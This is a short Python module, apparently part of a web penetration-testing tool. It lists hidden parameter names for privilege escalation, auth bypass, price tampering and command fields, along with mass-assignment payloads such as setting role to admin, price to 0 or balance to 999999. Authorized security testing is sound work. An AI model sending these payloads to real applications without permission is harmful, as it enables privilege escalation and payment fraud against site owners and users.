"""Hidden parameter wordlist and mass assignment payloads (Module 15)."""

HIDDEN_PARAMS = [
    # Admin/privilege escalation
    "admin","isAdmin","admin_only","role","roles","privilege","privileges",
    "group","groups","is_admin","is_superuser","superuser","manage","manager",
    "access_level","permission","permissions","auth","auth_level",
    "user_type","usertype","account_type","level","tier","plan",
    # Debug/backdoor
    "debug","debug_mode","test","testing","dev","development",
    "internal","backend","verbose","trace","profile","benchmark",
    # Bypass
    "bypass","skip","skip_auth","skip_verify","no_verify","unsafe",
    "trusted","verified","confirmed","approved","active","enabled",
    # Payment/price manipulation
    "price","price_total","amount","total","cost","fee","discount",
    "coupon","voucher","credit","balance","quantity","qty","num",
    "free","currency","tax","shipping","subtotal","total_price",
    # File/path manipulation
    "file","filename","filepath","path","dir","directory",
    "template","view","page","include","require","load",
    # Internal state
    "status","state","action","cmd","command","exec","run",
    "callback","redirect","return","returnUrl","next","continue",
    "method","type","mode","format","output","render",
    # User data override
    "id","uid","user_id","userid","account","owner","creator",
    "email","phone","address","name","username","password",
    "token","key","secret","api_key","access_token",
    # Feature flags
    "feature","feature_flag","flag","beta","alpha","preview",
    "early_access","private","public","visible","hidden",
    # Security-relevant
    "csrf","csrf_token","_csrf","__csrf","nonce","salt",
    "signature","signed","hash","hmac","checksum",
    "x_forwarded_for","x_real_ip","remote_addr","client_ip",
]

MASS_ASSIGN_PAYLOADS = [
    {"role": "admin"},
    {"isAdmin": True},
    {"is_superuser": True},
    {"admin": 1},
    {"privileges": ["admin","read","write","delete"]},
    {"permissions": "*"},
    {"group": "administrators"},
    {"account_type": "premium"},
    {"plan": "enterprise"},
    {"verified": True},
    {"active": True},
    {"status": "approved"},
    {"price": 0},
    {"price": 0.01},
    {"amount": -1},
    {"quantity": -1},
    {"discount": 100},
    {"fee": 0},
    {"balance": 999999},
    {"credit": 999999},
    {"id": 1},
    {"user_id": 1},
    {"owner": True},
    {"verified": True, "role": "admin", "isActive": True},
]
